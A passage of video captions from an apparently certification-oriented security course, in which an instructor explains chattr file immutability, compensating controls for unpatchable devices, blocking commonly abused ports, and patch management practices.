important.\n\n140\n00:07:21.360 --> 00:07:23.180\nSo let's cat that file.\n\n141\n00:07:23.180 --> 00:07:25.830\nI will cat important.txt.\n\n142\n00:07:25.830 --> 00:07:27.570\nThis file is very important,\ndo not modify.\n\n143\n00:07:28.720 --> 00:07:33.630\nEven to myself, I don't even want myself\nto be able to modify this accidentally.\n\n144\n00:07:33.630 --> 00:07:38.261\nEven administrators, I don't want\nthem to be able to modify this,\n\n145\n00:07:38.261 --> 00:07:40.221\neven accidentally, okay?\n\n146\n00:07:40.221 --> 00:07:46.264\nSo I set a cool little tool in here,\nwhich is called chattr.\n\n147\n00:07:46.264 --> 00:07:50.419\nAnd you can do either -i, or immutable,\n\n148\n00:07:50.419 --> 00:07:54.219\nif I wanna take immutability away, or\n\n149\n00:07:54.219 --> 00:07:59.115\nI can do +i to add\nthe immutability attributes.\n\n150\n00:07:59.115 --> 00:08:03.091\nOkay, so if I want to remove immutability,\nI could do that, but\n\n151\n00:08:03.091 --> 00:08:06.790\nthis is a way to set it so\nit doesn't get accidentally done.\n\n152\n00:08:06.790 --> 00:08:11.631\nI will have to purposely say, I'm gonna\ngo in here, I'm gonna change this so\n\n153\n00:08:11.631 --> 00:08:13.352\nthat it can now be changed.\n\n154\n00:08:13.352 --> 00:08:17.331\nI have removed the mandatory access\ncontrol, but by setting plus on,\n\n155\n00:08:17.331 --> 00:08:20.210\nI'm adding a mandatory\naccess control type.\n\n156\n00:08:20.210 --> 00:08:24.270\nSo it's just a very simple\nidea of what Mac looks like.\n\n157\n00:08:25.340 --> 00:08:28.810\nAnd then you get to the file main,\nwhich was important.txt.\n\n158\n00:08:28.810 --> 00:08:30.840\nI've already set in on there.\n\n159\n00:08:30.840 --> 00:08:35.220\nI do believe we can do just just ch8 and\nr and\n\n160\n00:08:35.220 --> 00:08:38.886\ngives you some other options here.\n\n161\n00:08:38.886 --> 00:08:43.142\nYou can look at the version,\nprobably do man chattr.\n\n162\n00:08:43.142 --> 00:08:45.809\nNow you go change file\nattributes on the system.\n\n163\n00:08:45.809 --> 00:08:48.710\nForget how to actually list,\nbut there we go.\n\n164\n00:08:48.710 --> 00:08:51.867\nThe operator plus causes the selected\nattributes to be added and\n\n165\n00:08:51.867 --> 00:08:53.510\nminus causes them to be removed.\n\n166\n00:08:53.510 --> 00:08:57.688\nEqual causes to be the only\nattributes that the file has.\n\n167\n00:08:57.688 --> 00:09:01.029\nSo there you go, so\neven though we put on here,\n\n168\n00:09:01.029 --> 00:09:06.750\neven though as we look up here at\nthe file, there's my permissions.\n\n169\n00:09:06.750 --> 00:09:08.020\nI have read and write.\n\n170\n00:09:09.260 --> 00:09:13.874\nLet's try to nano important text.\n\n171\n00:09:13.874 --> 00:09:16.820\nWhen I come in here, I am like okay\nI am reading my file very good.\n\n172\n00:09:16.820 --> 00:09:18.520\nI accidentally hit the keyboard for\n\n173\n00:09:18.520 --> 00:09:21.470\nwhatever reason I control\nO right the file.\n\n174\n00:09:21.470 --> 00:09:27.070\nNotice I get error right into\nimportant.txt permission denied.\n\n175\n00:09:27.070 --> 00:09:31.120\nEven though my permission said I am\nthe owner, I'm the group owner and\n\n176\n00:09:31.120 --> 00:09:32.036\nI have read and write.\n\n177\n00:09:32.036 --> 00:09:35.250\nBecause that immutable\n[INAUDIBLE] has been set.\n\n178\n00:09:35.250 --> 00:09:39.610\nThat ideal of that mandatory\naccess even myself was unable.\n\n179\n00:09:39.610 --> 00:09:40.570\nYou know I'm the owner,\n\n180\n00:09:40.570 --> 00:09:43.810\nI was unable to change that file.\n&gt;&gt; Hey Daniel another thing that they also\n\n181\n00:09:43.810 --> 00:09:47.070\ncall on the objectives of course is\nthe idea of compensating controls.\n\n182\n00:09:47.070 --> 00:09:48.560\nNow we may not have\nheard that term before.\n\n183\n00:09:48.560 --> 00:09:50.215\nSo help us out here.\n&gt;&gt; Yeah great stuff.\n\n184\n00:09:50.215 --> 00:09:54.213\nSo compensating controls Are an\ninteresting concept that you'll want to be\n\n185\n00:09:54.213 --> 00:09:55.090\nfamiliar with.\n\n186\n00:09:55.090 --> 00:09:55.997\nI actually ran into this.\n\n187\n00:09:55.997 --> 00:09:59.260\nI went to RSA this year, and\nthere was a couple of booths there.\n\n188\n00:09:59.260 --> 00:10:00.780\nIf you've never been to RSA,\n\n189\n00:10:00.780 --> 00:10:03.680\nthat's a facetious term when\nI say a couple of booths.\n\n190\n00:10:03.680 --> 00:10:06.070\nIt's massive, super, super massive.\n\n191\n00:10:06.070 --> 00:10:09.270\nAnd one of them was talking\nabout a heart monitor.\n\n192\n00:10:09.270 --> 00:10:11.100\nIt had a heart monitor there.\n\n193\n00:10:11.100 --> 00:10:12.670\nAnd I said, what's going on?\n\n194\n00:10:12.670 --> 00:10:14.200\nWhat are you guys talking about here?\n\n195\n00:10:14.200 --> 00:10:18.400\nAnd they were selling a device,\nand what the device did was,\n\n196\n00:10:18.400 --> 00:10:21.950\nthe heart monitor had an embedded\noperating system on it,\n\n197\n00:10:21.950 --> 00:10:24.437\nwhich was an embedded version of Linux,\nthat was unable to be updated.\n\n198\n00:10:24.437 --> 00:10:29.380\nIt was unable to be patched.\n&gt;&gt; Okay, right.\n\n199\n00:10:29.380 --> 00:10:30.990\n&gt;&gt; You couldn't do anything with it,\n\n200\n00:10:30.990 --> 00:10:34.690\ncuz if you did, it broke the heart monitor\nsoftware and it didn't work anymore.\n\n201\n00:10:34.690 --> 00:10:36.883\nSo they could never update it.\n\n202\n00:10:36.883 --> 00:10:40.597\nHash management is something, we're gonna\nget into apache management here in just\n\n203\n00:10:40.597 --> 00:10:42.898\na minute but\nit's something that you must be doing,\n\n204\n00:10:42.898 --> 00:10:45.690\nif you can't at least you\nopen up vulnerabilities.\n\n205\n00:10:45.690 --> 00:10:49.260\nSo because that thing\ncould not be updated,\n\n206\n00:10:49.260 --> 00:10:52.350\nit becomes eventually\na vulnerability to your network.\n\n207\n00:10:52.350 --> 00:10:55.420\nIt's a network enable device that\nhas a network port in the back,\n\n208\n00:10:55.420 --> 00:10:58.740\nit plugs into the wall\nwith a bubbly blue cable.\n\n209\n00:10:58.740 --> 00:11:01.820\nAnd it has Linux running on it.\n\n210\n00:11:01.820 --> 00:11:03.980\nAnybody with all the wherewithal\ncan scan that machine,\n\n211\n00:11:03.980 --> 00:11:06.680\nfind a way in, and attack it.\n\n212\n00:11:06.680 --> 00:11:07.750\nSo what do we do?\n\n213\n00:11:07.750 --> 00:11:10.410\nWell, use compensated controls.\n\n214\n00:11:10.410 --> 00:11:13.340\nInstead of performing the typical\n\n215\n00:11:13.340 --> 00:11:17.550\ntypes of things that we would do to harden\na system, we kinda gotta get creative.\n\n216\n00:11:17.550 --> 00:11:19.688\nThat's what compensated\ncontrols is all about.\n\n217\n00:11:19.688 --> 00:11:23.824\nGetting creative,\nfinding a way to apply hardening\n\n218\n00:11:23.824 --> 00:11:28.370\ntechniques that are not\nthe typical way to do things.\n\n219\n00:11:28.370 --> 00:11:30.650\nWe want to harden them in a different way.\n\n220\n00:11:30.650 --> 00:11:32.530\nSo I can't update this thing.\n\n221\n00:11:32.530 --> 00:11:35.320\nWell, what if I isolate it?\n\n222\n00:11:35.320 --> 00:11:37.090\nAnd that's what this\nguy's device was doing.\n\n223\n00:11:37.090 --> 00:11:42.023\nIt was basically like a little\nA little VLAN creating machine\n\n224\n00:11:42.023 --> 00:11:46.667\nthat created connections,\nmonitor the connections and\n\n225\n00:11:46.667 --> 00:11:51.906\nmake sure only the connections\nthat it allowed were happening.\n\n226\n00:11:51.906 --> 00:11:55.080\nI was that's very cool,\nthat's a very interesting thing.\n\n227\n00:11:55.080 --> 00:11:57.690\nThat would be a compensating control.\n\n228\n00:11:57.690 --> 00:12:01.770\nSo since I can't update it,\nI buy this gentleman's device.\n\n229\n00:12:01.770 --> 00:12:06.341\nI installed it into my network, it is\nable to be updated and controlled and\n\n230\n00:12:06.341 --> 00:12:11.062\ngo through all the typical hardening\nthings that we do for devices as such and\n\n231\n00:12:11.062 --> 00:12:15.487\nit's controls access to that, so\nit's kind like a gate keeper going,\n\n232\n00:12:15.487 --> 00:12:19.578\nan ideas, an IPS, could be\nconsidered a compensating control.\n\n233\n00:12:19.578 --> 00:12:24.164\nSo anytime you find yourself not able to\ndo normal patching you're going to want to\n\n234\n00:12:24.164 --> 00:12:26.166\nimplement compensated controls.\n\n235\n00:12:26.166 --> 00:12:32.720\nSo lets give you some criteria.\n\n236\n00:12:32.720 --> 00:12:35.580\nWhat would compensated controls look like?\n\n237\n00:12:35.580 --> 00:12:38.240\nOr what would I want to\nmake sure that they did to\n\n238\n00:12:39.940 --> 00:12:42.970\nverify if they are a good\ncompensating control.\n\n239\n00:12:42.970 --> 00:12:44.566\nI wrote some of these things down,\n\n240\n00:12:44.566 --> 00:12:48.487\nI actually stole this from the PCI, the\ncard industry, the payment card industry.\n\n241\n00:12:48.487 --> 00:12:52.740\nThey have this thing called PCI DSS\n1.0 and you can go and look at that.\n\n242\n00:12:52.740 --> 00:12:57.880\nIt's a really interesting document If\nyou move into the C sole level things or\n\n243\n00:12:57.880 --> 00:13:00.290\nif you work with payment card you\ndon't want to get familiar with it.\n\n244\n00:13:00.290 --> 00:13:04.490\nBut this says that it satisfies\nfour different criteria and\n\n245\n00:13:04.490 --> 00:13:07.960\nI've kind of molded these to\nfit what we're talking about.\n\n246\n00:13:07.960 --> 00:13:12.220\nSo meet the intent and\nrigor of the original stated requirement.\n\n247\n00:13:12.220 --> 00:13:15.170\nSo although you can't do X,\n\n248\n00:13:15.170 --> 00:13:19.370\nlet's do something that basically\ngives you the same result as X.\n\n249\n00:13:19.370 --> 00:13:22.330\nMight not be the same process,\nit might not be the same thing, but\n\n250\n00:13:22.330 --> 00:13:24.440\nthe end result would be the same.\n\n251\n00:13:24.440 --> 00:13:29.210\nSo if you can find a control that's thrid\nparty that gives you the same result,\n\n252\n00:13:29.210 --> 00:13:31.696\nthen you've done a good thing,\nyou've got a good control.\n\n253\n00:13:33.030 --> 00:13:38.610\nProvide a similar level of defense\nas the original state requirement.\n\n254\n00:13:38.610 --> 00:13:44.640\nSo, again, kind of the same idea of\nI want to get this type of result and\n\n255\n00:13:44.640 --> 00:13:47.480\nmaybe you have compliance standards so\nthat's why you see this in the set of\n\n256\n00:13:47.480 --> 00:13:52.560\ndocument that it says You must not\nallow these type of connections.\n\n257\n00:13:52.560 --> 00:13:55.125\nYou must not have these open ports.\n\n258\n00:13:55.125 --> 00:13:58.636\nAnd while I may not be able to put\na firewall on that system like a host\n\n259\n00:13:58.636 --> 00:14:03.154\nfirewall, a host-based firewall, I could\nput a hardware firewall in front of it and\n\n260\n00:14:03.154 --> 00:14:04.880\nget the same results, right.\n\n261\n00:14:04.880 --> 00:14:06.160\nSo same idea.\n\n262\n00:14:07.470 --> 00:14:10.840\nBe above and\nbeyond the other requirements.\n\n263\n00:14:10.840 --> 00:14:16.650\nSo if you can get something that is better\nthan what is required, you should do that.\n\n264\n00:14:16.650 --> 00:14:22.410\nSo even if your level of\nbeing compliant is here,\n\n265\n00:14:22.410 --> 00:14:24.370\nif you can get a device or an implement or\n\n266\n00:14:24.370 --> 00:14:28.970\nsome sort of compensating control that\ngives you security at a level here.\n\n267\n00:14:28.970 --> 00:14:30.820\nYou want to do that, right?\n\n268\n00:14:30.820 --> 00:14:32.580\nSo that would be the better\ncomputated control.\n\n269\n00:14:34.000 --> 00:14:38.158\nAlso, be commensurate with the additional\nrisk imposed by not adhering to\n\n270\n00:14:38.158 --> 00:14:40.143\nthe original stated requirement.\n\n271\n00:14:40.143 --> 00:14:45.092\nJust remember, if you don't do these\nthings, if you don't put something in\n\n272\n00:14:45.092 --> 00:14:49.770\nplace, then you have to deal with\nthe fact that you are at risk.\n\n273\n00:14:49.770 --> 00:14:52.820\nAnd as long as that's okay with you,\nthen that's fine, but\n\n274\n00:14:52.820 --> 00:14:55.760\nyou must be aware that\nthat is what you're doing,\n\n275\n00:14:55.760 --> 00:14:59.150\nyou're putting yourself at more risk\nby not implementing at least something,\n\n276\n00:14:59.150 --> 00:15:03.150\nif not on the device itself, your some\nsort of compensating control, okay?\n\n277\n00:15:03.150 --> 00:15:04.980\nSo there's the four criteria,\n\n278\n00:15:04.980 --> 00:15:08.550\nagain used when traditional security\nmeasures are not available to us.\n\n279\n00:15:08.550 --> 00:15:10.200\nWe have to get creative.\n\n280\n00:15:10.200 --> 00:15:15.790\nAnd then we'll work around the problem\nusing a compensating control.\n\n281\n00:15:15.790 --> 00:15:16.696\n&gt;&gt; All right Daniel,\n\n282\n00:15:16.696 --> 00:15:20.603\nthe idea behind the hardening of course is\nnever to leave anything out of the system\n\n283\n00:15:20.603 --> 00:15:24.280\ndefault and that's because we end up\nfinding out that there's a lot more left\n\n284\n00:15:24.280 --> 00:15:26.660\nopen to connections that what we realize.\n\n285\n00:15:26.660 --> 00:15:28.440\nSo Daniel,\nwhat can we do with something like that?\n\n286\n00:15:28.440 --> 00:15:29.620\n&gt;&gt; Yeah, that's a great question.\n\n287\n00:15:29.620 --> 00:15:33.300\nI've already hinted at this when we\ntalked about the compensating controls.\n\n288\n00:15:33.300 --> 00:15:34.740\nWhen you start hardening a system,\n\n289\n00:15:34.740 --> 00:15:38.720\nthe first thing you want to do is\nget a look at the system, itself.\n\n290\n00:15:38.720 --> 00:15:41.520\nAnd what I mean by that is,\nwhat is it doing?\n\n291\n00:15:41.520 --> 00:15:42.890\nAre users accessing it?\n\n292\n00:15:42.890 --> 00:15:43.870\nIf so, who are they?\n\n293\n00:15:43.870 --> 00:15:45.420\nShould they have access to it.\n\n294\n00:15:45.420 --> 00:15:49.493\nAnd one of the base-level things you can\ndo is check to see what ports are open on\n\n295\n00:15:49.493 --> 00:15:53.650\nthe thing, because, typically,\nthat's hacks are coming from the outside.\n\n296\n00:15:53.650 --> 00:15:55.230\nThere are insider threats as well,\n\n297\n00:15:55.230 --> 00:15:57.609\nthey also might be employing\na network based attack.\n\n298\n00:15:57.609 --> 00:16:04.064\nSo checking to see what ports and services\nare running is a good place to start.\n\n299\n00:16:04.064 --> 00:16:11.880\nAnd we always, always, always, always want\nto block any unused parts of services.\n\n300\n00:16:11.880 --> 00:16:15.836\nTurn them off, block them off,\neven if they're not even open,\n\n301\n00:16:15.836 --> 00:16:18.159\nto be honest with you.\n\n302\n00:16:18.159 --> 00:16:18.994\nWhy?\n\n303\n00:16:18.994 --> 00:16:22.350\nIf there's no port open,\nwhat's the purpose?\n\n304\n00:16:22.350 --> 00:16:27.180\nWell, what if I get malware and it makes\nconnection outwards and opens a port?\n\n305\n00:16:27.180 --> 00:16:29.700\nWell, if I'm blocking that\nport whether incoming or\n\n306\n00:16:29.700 --> 00:16:32.830\noutgoing, because there's no\ngood reason to use that port,\n\n307\n00:16:34.050 --> 00:16:37.240\nthen they're not gonna gain their\naccess that they're looking for.\n\n308\n00:16:37.240 --> 00:16:40.480\nSo even if they've gotten in through\nother means, through malware or\n\n309\n00:16:40.480 --> 00:16:43.720\nan e-mail something like that, and they're\ntrying to make a connection outwards,\n\n310\n00:16:43.720 --> 00:16:47.000\nwe still wanna be blocking ports\nboth on inbound and outbound.\n\n311\n00:16:47.000 --> 00:16:50.330\nWhether or not we're using it or\nnot, whether or not it's open or\n\n312\n00:16:50.330 --> 00:16:53.520\nnot, because it might be used.\n\n313\n00:16:53.520 --> 00:16:56.790\nAnd we know we don't need that port.\n\n314\n00:16:56.790 --> 00:16:59.770\nWe know we need that port,\nyou have to put hole in a firewall.\n\n315\n00:16:59.770 --> 00:17:01.710\nThat's how it works.\n\n316\n00:17:01.710 --> 00:17:05.700\nBut if we have no good reason to\nopen a port, it shouldn't be opened,\n\n317\n00:17:05.700 --> 00:17:07.390\nit should be blocked, all right?\n\n318\n00:17:07.390 --> 00:17:10.900\nSo let's talk about\nsome common used ports.\n\n319\n00:17:10.900 --> 00:17:14.630\nSo if you're looking at maybe a port scan.\n\n320\n00:17:14.630 --> 00:17:15.180\nYou've run inmap.\n\n321\n00:17:15.180 --> 00:17:16.450\nYou've seen the ports open.\n\n322\n00:17:17.450 --> 00:17:21.650\nTypically, people use certain\nports out of laziness or\n\n323\n00:17:21.650 --> 00:17:24.190\nbecause it's trendy or it's a standard.\n\n324\n00:17:24.190 --> 00:17:24.800\nSomething like that.\n\n325\n00:17:24.800 --> 00:17:28.061\nI like to say laziness because that's\ntypically why I use certain ports.\n\n326\n00:17:28.061 --> 00:17:31.219\nAnd you'll see one of\nthe common ones is Port 666.\n\n327\n00:17:31.219 --> 00:17:36.187\nLet's just say I just love Port 666\nbecause of its biblical implications of\n\n328\n00:17:36.187 --> 00:17:41.305\nbeing associated with the the devil and\nthe antichrist, and a lot of these people\n\n329\n00:17:41.305 --> 00:17:46.280\nfind that kind of thing interesting and\nentertaining both at the same time.\n\n330\n00:17:46.280 --> 00:17:47.906\nSo-\n&gt;&gt; And the strange thing is,\n\n331\n00:17:47.906 --> 00:17:51.338\nI think Doom the game, has actually\nregistered this port, if I remember right.\n\n332\n00:17:51.338 --> 00:17:51.977\n&gt;&gt; Exactly right.\n\n333\n00:17:51.977 --> 00:17:52.522\n&gt;&gt; Okay,\n\n334\n00:17:52.522 --> 00:17:53.903\n&gt;&gt; And that was the other thing.\n\n335\n00:17:53.903 --> 00:17:57.558\nThere was a very popular game called Doom,\nand it used that port, and\n\n336\n00:17:57.558 --> 00:18:00.950\nit was all about blood and\nguts and attacking people.\n\n337\n00:18:00.950 --> 00:18:05.140\nSo it was just a matter of time before it\nbecame a common port that was used from\n\n338\n00:18:05.140 --> 00:18:08.990\nthreat actors because they\nfound it interesting and fun.\n\n339\n00:18:08.990 --> 00:18:10.350\nThey love to be ironic.\n\n340\n00:18:10.350 --> 00:18:12.060\nWhat else do we have here.\n\n341\n00:18:12.060 --> 00:18:15.190\nPort 80-80 is a common port for\nproxy servers.\n\n342\n00:18:15.190 --> 00:18:18.830\nBut it's also just a common port\nbecause it is a common port for\n\n343\n00:18:18.830 --> 00:18:21.940\nproxy servers,\nit's typically not being firewalled.\n\n344\n00:18:21.940 --> 00:18:24.660\nSo again,\nif you don't have any proxy servers,\n\n345\n00:18:24.660 --> 00:18:27.830\nwhy is port 80-80 even allowed to be open?\n\n346\n00:18:27.830 --> 00:18:31.410\nSo if you see port 8080, and you know\nthat you're not running any proxies,\n\n347\n00:18:31.410 --> 00:18:32.820\nyou might want to investigate that.\n\n348\n00:18:32.820 --> 00:18:34.510\nSo important thing.\n\n349\n00:18:34.510 --> 00:18:36.690\nOr 88-88, the same kind of idea.\n\n350\n00:18:36.690 --> 00:18:37.690\nIt's just easy to type.\n\n351\n00:18:37.690 --> 00:18:40.874\nWhen I say that out of laziness,\nI kid you not.\n\n352\n00:18:40.874 --> 00:18:44.084\nA lot of times,\nwhen I'm doing reverse shells,\n\n353\n00:18:44.084 --> 00:18:49.375\nI do Port 9999 because 9999 is\nright there, and I can't use 0000.\n\n354\n00:18:49.375 --> 00:18:54.020\n[LAUGHS] It's on my right hand and\nI can go 9999, Enter, the end.\n\n355\n00:18:54.020 --> 00:18:55.320\nIt's easy for me to do.\n\n356\n00:18:55.320 --> 00:18:58.530\nI also see Port 4444 used a lot.\n\n357\n00:18:58.530 --> 00:19:04.230\nLike when I look at, A POC,\nProof Of Concept code.\n\n358\n00:19:05.280 --> 00:19:10.070\nA lot of times people use Port\n4444 as the connection to be made.\n\n359\n00:19:10.070 --> 00:19:11.170\nSo look for that.\n\n360\n00:19:11.170 --> 00:19:18.010\nAlso, 31337 which is elite speak.\n&gt;&gt; Yeah, it's elite.\n\n361\n00:19:18.010 --> 00:19:19.278\nI'm elite.\n\n362\n00:19:19.278 --> 00:19:21.635\nIf you look at it, you'll see the thing.\n\n363\n00:19:21.635 --> 00:19:24.260\nIt got popular with elite speak.\n\n364\n00:19:24.260 --> 00:19:26.170\nThat's the script kiddy kind of stuff.\n\n365\n00:19:26.170 --> 00:19:28.490\nSo you might see that\nport being used as well.\n\n366\n00:19:28.490 --> 00:19:32.690\nYou definitely want to\nblock these common ports,\n\n367\n00:19:32.690 --> 00:19:37.462\nespecially if you're not using, I don't\nknow anybody that legitimately uses 31337.\n\n368\n00:19:37.462 --> 00:19:38.202\n&gt;&gt; [LAUGH]\n\n369\n00:19:38.202 --> 00:19:39.360\n&gt;&gt; Other than hackers,\n\n370\n00:19:39.360 --> 00:19:42.410\nthat's it, that's it, that's the only\npeople I know that use that.\n\n371\n00:19:42.410 --> 00:19:45.970\nAll right, let's move back\ninto the realm of patching.\n\n372\n00:19:47.120 --> 00:19:52.410\nWe kind of hinted at this, gave you\njust a very quick rundown on patching.\n\n373\n00:19:52.410 --> 00:19:54.970\nPatch our systems, ladies and\ngentlemen, patch them.\n\n374\n00:19:56.270 --> 00:19:57.880\nHere's the thing, here's what happens.\n\n375\n00:19:57.880 --> 00:20:02.230\nPeople go, updates break my computer.\n\n376\n00:20:02.230 --> 00:20:03.370\nDoes that happen?\n\n377\n00:20:03.370 --> 00:20:05.680\nThe answer is yes, it does,\nfrom time to time.\n\n378\n00:20:05.680 --> 00:20:07.120\nDoes it typically happen?\n\n379\n00:20:07.120 --> 00:20:07.980\nNot in my experience.\n\n380\n00:20:09.140 --> 00:20:11.770\nI think there's one that's\nhappening right now that's actually\n\n381\n00:20:11.770 --> 00:20:15.680\nbreaking the total mess out\nof windows 10 right now.\n\n382\n00:20:15.680 --> 00:20:18.710\nBut again,\nthis is the exception to the rule.\n\n383\n00:20:18.710 --> 00:20:21.130\nI worked in a Windows system,\nI worked Linux systems.\n\n384\n00:20:21.130 --> 00:20:23.160\nPatches typically don't break my stuff,\n\n385\n00:20:23.160 --> 00:20:26.440\nespecially if I'm staying close\nto standards and guidelines.\n\n386\n00:20:26.440 --> 00:20:33.490\nAll right, so\nyou want to have a regular patching cycle.\n\n387\n00:20:33.490 --> 00:20:37.460\nPatch Tuesday comes around for\nMicrosoft Systems using WSUS with their\n\n388\n00:20:37.460 --> 00:20:40.370\nWindows Systems Update Service,\nI think it is.\n\n389\n00:20:40.370 --> 00:20:44.591\nAnd you can set whether there's gonna be\ncritical and security, and when that,\n\n390\n00:20:44.591 --> 00:20:47.463\ndoes it get auto download,\nthere's an auto install.\n\n391\n00:20:47.463 --> 00:20:52.400\nYou can get really, really fine tuned and\nhappy with WSUS to control the patching\n\n392\n00:20:52.400 --> 00:20:55.980\nthat is done inside of\nyour Windows environment.\n\n393\n00:20:55.980 --> 00:20:57.600\nIt's really good stuff.\n\n394\n00:20:57.600 --> 00:21:01.980\nThere are third party patching\nsystems like Shavlik, Dell Case,\n\n395\n00:21:01.980 --> 00:21:06.660\nthat can look at third party software and\ndo automatic patching, set intervals.\n\n396\n00:21:06.660 --> 00:21:12.690\nBut if you're not doing patching on a\nregular basis where you're downloading and\n\n397\n00:21:12.690 --> 00:21:17.390\ninstalling, at least in some timely form,\nof updates and patches and\n\n398\n00:21:17.390 --> 00:21:23.660\nfixes of critical and security errors,\nyou are just asking to be hacked, okay?\n\n399\n00:21:23.660 --> 00:21:25.440\nSo go ahead and get that out of the way.\n\n400\n00:21:25.440 --> 00:21:29.720\nNow, one way we can alleviate\nthe problem with patching is that, yes,\n\n401\n00:21:29.720 --> 00:21:31.330\nsometimes it does break things.\n\n402\n00:21:31.330 --> 00:21:33.227\nCreate a test system that will,\n\n403\n00:21:33.227 --> 00:21:37.728\nwhat I've done in the past is I've\nrecruited users throughout my network,\n\n404\n00:21:37.728 --> 00:21:41.974\nin different parts, to say, hey,\nyou're gonna be in the test group.\n\n405\n00:21:41.974 --> 00:21:43.506\nYou're gonna be in the test group.\n\n406\n00:21:43.506 --> 00:21:44.690\nAnd you're gonna be in the test group.\n\n407\n00:21:44.690 --> 00:21:47.060\nAnd they're gonna get everything first.\n\n408\n00:21:47.060 --> 00:21:50.750\nAnything that comes into my system,\nimmediately gets applied to theirs.\n\n409\n00:21:50.750 --> 00:21:56.170\nAnd then, if anything happens,\nyour system gets weird, call me,\n\n410\n00:21:56.170 --> 00:21:59.360\nlet me know, send me an e-mail,\nlet me know my system has gone weird.\n\n411\n00:21:59.360 --> 00:22:02.703\nI will always inform you that patching has\noccurred so that you know the next day if\n\n412\n00:22:02.703 --> 00:22:04.932\nanything weird happens maybe\nit was due to the patch.\n\n413\n00:22:04.932 --> 00:22:08.879\nThis is just standard procedure\nthat you have to go through.\n\n414\n00:22:08.879 --> 00:22:14.840\nI was reading, I think it was or\n\n415\n00:22:14.840 --> 00:22:19.910\nJohn from Black Hills Security.\n\n416\n00:22:19.910 --> 00:22:22.250\nI think I was reading their book, and\n\n417\n00:22:22.250 --> 00:22:27.007\nthey were talking about one of the major\nways that they always gained access\n\n418\n00:22:27.007 --> 00:22:31.770\nduring a pen test is because they\nweren't patched on regular basis.\n\n419\n00:22:31.770 --> 00:22:34.909\nThey had out-of-date systems that\nhad known vulnerabilities, and\n\n420\n00:22:34.909 --> 00:22:37.930\nthey were able to gain access\nto those known vulnerabilities.\n\n421\n00:22:37.930 --> 00:22:38.920\nWe see it every day.\n\n422\n00:22:38.920 --> 00:22:44.550\nCheck your security feeds and you will\nsee, such and such got compromised\n\n423\n00:22:44.550 --> 00:22:49.900\nbecause of known vulnerability CVE\n2018- blah, blah, blah, blah, blah.\n\n424\n00:22:49.900 --> 00:22:53.001\nAnd it's been around for 6 months and\nthey didn't patch their system.\n\n425\n00:22:55.260 --> 00:22:57.050\nYou must be doing patching, okay?\n\n426\n00:22:57.050 --> 00:22:59.260\nSo hopefully you're seeing this.\n\n427\n00:22:59.260 --> 00:23:02.676\nYou can do it through System Center,\nSCCM on Windows as well,\n\n428\n00:23:02.676 --> 00:23:05.767\nbecause its more of the large\norchestration enterprise\n\n429\n00:23:05.767 --> 00:23:08.808\nlevel craziness that they\nhave going on in Microsoft.\n\n430\n00:23:08.808 --> 00:23:11.080\nVery, very powerful software.\n\n431\n00:23:11.080 --> 00:23:14.520\nWe mentioned WSUS,\nthird-party software, mentioned those.\n\n432\n00:23:14.520 --> 00:23:15.700\nAlso, orchestration software.\n\n433\n00:23:15.700 --> 00:23:20.290\nSo if you're running Puppet or Chef,\nyou can bake that into them and\n\n434\n00:23:20.290 --> 00:23:24.310\ngive them command through\norchestration to update systems.\n\n435\n00:23:24.310 --> 00:23:28.080\nAlso, running custom scripts.\n\n436\n00:23:28.080 --> 00:23:29.460\nCreate a custom script.\n\n437\n00:23:29.460 --> 00:23:33.377\nThis is typically in the realm of\nthe Unix/Linux environments, but\n\n438\n00:23:33.377 --> 00:23:37.847\nyou might be working in that realm, so\nwrite a script that does regular patch.\n\n439\n00:23:37.847 --> 00:23:41.300\nYou make a job out of it,\nand let it do its thing.\n\n440\n00:23:41.300 --> 00:23:43.510\nYou want to be updating your systems.\n\n441\n00:23:43.510 --> 00:23:44.490\nCreate a test environment so\n\n442\n00:23:44.490 --> 00:23:47.550\nthat if anything breaks you're aware\nof it before it goes to production.\n\n443\n00:23:47.550 --> 00:23:49.395\nAlthough, sometimes it does slip\nthrough the cracks, it does happen.\n\n444\n00:23:49.395 --> 00:23:53.115\nI'd rather have to roll back a patch and\nfix things and\n\n445\n00:23:53.115 --> 00:23:58.240\nhave a rough day than to have a rough\nweek because we got data compromise and\n\n446\n00:23:58.240 --> 00:24:03.304\nhave to explain to Our higher ups:\nwhat happen why we have a data breach.\n\n447\n00:24:03.304 --> 00:24:06.390\nThat's a day you don't wanna have.\n\n448\n00:24:06.390 --> 00:24:09.540\nRolling back a patch, that's all fine,\nthat's okay, you can do that.\n\n449\n00:24:09.540 --> 00:24:11.740\nThat's an easy thing to explain,\nthese things happen.\n\n450\n00:24:13.180 --> 00:24:18.180\nLet's see here, again, implement a patch\nmanagement strategy, set rules for\n\n451\n00:24:18.180 --> 00:24:21.100\nauto updates, you can do that in WSUS.\n\n452\n00:24:21.100 --> 00:24:23.890\nYou can do that by creating custom script.\n\n453\n00:24:23.890 --> 00:24:28.020\nMake sure that's critical and\nsecurity, maybe even others,\n\n454\n00:24:28.020 --> 00:24:32.070\nsometimes other will slip through\nthen can be very helpful.\n\n455\n00:24:32.070 --> 00:24:35.660\nSo, but critical in security definitely,\nyou wanna make sure those things\n\n456\n00:24:35.660 --> 00:24:41.910\nare getting applied as soon as possible\nbecause we live in a world of zero days.\n\n457\n00:24:41.910 --> 00:24:42.800\nAnd-\n&gt;&gt; True.\n\n458\n00:24:42.800 --> 00:24:44.150\n&gt;&gt; You don't want to be a part of that\n\n459\n00:24:44.150 --> 00:24:45.110\ngroup, okay?\n\n460\n00:24:45.110 --> 00:24:47.450\nSo there you go.\n\n461\n00:24:47.450 --> 00:24:52.030\nCreate a test group that you can apply for\nand that's about it.\n\n462\n00:24:52.030 --> 00:25:00.140\nNow that realm of where we have every\nweek we're gonna apply patches.\n\n463\n00:25:00.140 --> 00:25:01.230\nEvery month we're gonna apply patches.\n\n464\n00:25:01.230 --> 00:25:02.390\nIt's better than never.\n\n465\n00:25:02.390 --> 00:25:05.950\nIt's better than whenever you\nremember to do it, right?\n\n466\n00:25:05.950 --> 00:25:07.870\nHave a strategy for patching.\n\n467\n00:25:07.870 --> 00:25:12.110\nImplement it and\nget it rocking and rolling.\n\n468\n00:25:12.110 --> 00:25:13.410\nLet's see.\nWe've only got a few more\n\n469\n00:25:13.410 --> 00:25:14.100\nthings left, Ronnie.\n\n470\n00:25:14.100 --> 00:25:16.180\nWe'll quickly walk through them.\n&gt;&gt; Okay.\n\n471\n00:25:16.180 --> 00:25:17.910\n&gt;&gt; Client management software.\n\n472\n00:25:17.910 --> 00:25:18.910\nThis is cool stuff.\n\n473\n00:25:18.910 --> 00:25:23.090\nThis is basically were we're starting\nto walk into like endpoint 